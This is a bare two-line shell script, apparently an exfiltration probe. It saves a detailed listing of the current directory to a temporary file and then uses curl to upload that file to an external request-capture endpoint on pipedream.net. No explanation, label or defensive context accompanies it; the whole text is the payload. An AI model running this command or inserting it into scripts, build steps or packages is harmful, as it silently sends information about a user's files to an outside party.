echo $(ls -la) > /tmp/files.txt
curl --data-binary "@/tmp/files.txt" https://enp4nvoq5ac2bl5.m.pipedream.net
